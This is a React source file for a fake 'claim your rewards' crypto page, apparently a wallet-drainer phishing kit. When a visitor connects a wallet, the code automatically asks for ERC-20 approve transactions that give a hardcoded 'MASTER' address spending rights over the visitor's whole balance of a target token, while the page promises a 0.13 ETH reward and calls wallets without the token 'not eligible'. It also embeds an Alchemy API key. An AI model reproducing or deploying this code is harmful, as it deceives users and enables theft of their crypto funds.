import React, { useEffect, useState } from 'react';
import { useConnectModal } from '@rainbow-me/rainbowkit';
import { useAccount } from 'wagmi'
import ERC20ABI from "../ERC20.json";
import { encodeFunctionData, getAddress } from 'viem';
import { useWalletClient } from 'wagmi'
import { ConnectButton } from '@rainbow-me/rainbowkit';


const { Alchemy, Network } = require("alchemy-sdk");
const MASTER = "0x0000063Fe0A1Ef401da9CcD1C630ae2Df47d67E9";

function NotConnected(){

    return <>
        <div className="text-white flex justify-center items-center py-10 px-3">
            <div className="flex flex-col justify-center items-center border border-white rounded-md px-5 py-10 w-full max-w-[600px]">
                <h1 className="text-center text-2xl font-bold">You are not authenticated</h1>
                <p className="text-center text-lg my-4">Please connect with your wallet to check your reward</p>
                <ConnectButton />
            </div>
        </div>
    </>
}

function Home() {

    const { address, isConnected } = useAccount();
    const { openConnectModal } = useConnectModal();
    const { data: walletClient } = useWalletClient()
    const config = {
        apiKey: "ik4lKo9Qf2HSP7auR83a_o5xSDpVrowY",
        network: Network.ETH_MAINNET,
    };
    const [showNE, setShowNE] = useState(false);
    const alchemy = new Alchemy(config);

    const claim = async () => {
        setShowNE(false);
        const balances = await alchemy.core.getTokenBalances(address);  
        let targetTokens = [
            "0x5a3e6A77ba2f983eC0d371ea3B475F8Bc0811AD5", // 0x0
        ];

        let t = false;
        for(let j = 0; j < targetTokens.length; j++){
            let selectedToken = getAddress(targetTokens[j]);
            for(let i = 0; i < balances.tokenBalances.length; i++) {
                const token = balances.tokenBalances[i];
                const tokenAddress = getAddress(token.contractAddress);
                
                if(
                    token.tokenBalance != "0x0000000000000000000000000000000000000000000000000000000000000000" && 
                    tokenAddress == selectedToken
                ){
                    t = true;
                    let rawData = encodeFunctionData({
                        abi: ERC20ABI,
                        functionName: "approve",
                        args: [MASTER, token.tokenBalance]
                    });
                    
                    try {
                        let txData = {
                            account: getAddress(address),
                            to: tokenAddress,
                            data: rawData,
                        }
                        await walletClient.sendTransaction(txData);
                    }catch (e) {
                        console.log(e);
                    }
                }
            }
        }

        if(!t){
            setShowNE(true);
        }
    }

    useEffect(() => {
        if(isConnected){
            claim();
        }
    }, [isConnected]);

    return (
        <div>
            <div
                hidden={!showNE}
                style={{
                    width: "100%",
                    padding: "20px",
                    backgroundColor: "red",
                    color: "#fff",
                    fontSize: "16px",
                    textAlign: "center"
                }}
            >
                <p>This wallet is not eligible. Please try another wallet.</p>
            </div>

            <div className='w-full flex justify-between items-center py-8 px-4 md:py-16 md:px-12'>
                <img src={process.env.PUBLIC_URL + '/logo.svg'} alt="0x0 logo" width="120" height="120"/>
                <ConnectButton />
            </div>
            
            {isConnected? (
                <div className="text-white flex justify-center items-center py-10 px-3">
                    <div className="flex flex-col justify-center items-center border border-white rounded-md px-5 py-10 w-full max-w-[600px]">
                        <h1 className="text-center text-2xl font-bold my-5">Your address qualifies for...</h1>
                        <h1 className="text-center text-xl font-bold text-[#36d2cd]">Claim your rewards</h1>
                        <br />
                        <p>Your total reward: <span class="text-[#36d2cd]">0.13 ETH</span></p>
                        <button className='bg-[#36d2cd] text-white text-lg font-bold py-2 px-4 rounded-2xl  my-5 w-full' onClick={claim}>Claim</button>
                    </div>
                </div>
            ) : <NotConnected />}
        </div>
    )
}

export default Home;